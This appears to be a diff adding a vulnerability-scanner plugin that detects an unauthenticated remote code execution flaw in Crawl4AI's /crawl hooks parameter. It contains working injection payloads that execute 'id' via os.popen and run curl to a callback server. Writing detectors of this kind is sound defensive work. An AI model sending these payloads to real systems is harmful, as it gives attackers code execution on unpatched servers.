@@ -1,0 +1,138 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Crawl4AI_Hooks_RCE_CVE_2026_26216"
+  author: "mangeshwalsane2-hash"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-26216"
+  }
+  severity: CRITICAL
+  title: "Unauthenticated Remote Code Execution via Hooks Parameter in Crawl4AI"
+  description: "Crawl4AI versions prior to 0.8.0 contain a remote code execution vulnerability in the Docker API deployment. The /crawl endpoint accepts a hooks parameter containing Python code that is executed using exec(). The __import__ builtin was included in the allowed builtins, allowing unauthenticated remote attackers to import arbitrary modules and execute system commands."
+  recommendation: "Upgrade Crawl4AI to version 0.8.0 or higher, keep dynamic hooks disabled (CRAWL4AI_HOOKS_ENABLED=false), enable JWT authentication, and avoid exposing the API to untrusted networks."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-26216"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_crawl4ai"
+  http_request: {
+    method: POST
+    uri: "/crawl"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{\"urls\": [\"raw://<html><body><div>test</div></body></html>\"]}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "\"cleaned_html\""
+          },
+          {
+            body: {}
+            contains: "\"success\""
+          }
+        ]
+      }
+    }
+  }
+}
+
+# Without callback server enabled (Reflective Check)
+actions: {
+  name: "trigger_rce_hooks_reflective"
+  http_request: {
+    method: POST
+    uri: "/crawl"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{\"urls\":[\"raw://<html><body>test</body></html>\"],\"hooks\":{\"code\":{\"on_page_context_created\":\"raise __import__(\\\"builtins\\\").Exception(__import__(\\\"os\\\").popen(\\\"id\\\").read())\\nasync def hook(page, context, **kwargs):\\n    return page\"}}}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "uid="
+          }
+        ]
+      }
+    }
+  }
+}
+
+# With callback server enabled (Out-of-Band Check)
+actions: {
+  name: "trigger_rce_hooks_oob"
+  http_request: {
+    method: POST
+    uri: "/crawl"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{\"urls\":[\"raw://<html><body>test</body></html>\"],\"hooks\":{\"code\":{\"on_page_context_created\":\"__import__(\\\"os\\\").system(\\\"curl {{ T_CBS_URI }}\\\")\\nasync def hook(page, context, **kwargs):\\n    return page\"}}}"
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_crawl4ai",
+    "trigger_rce_hooks_oob",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+workflows: {
+  actions: [
+    "fingerprint_crawl4ai",
+    "trigger_rce_hooks_reflective"
+  ]
+}
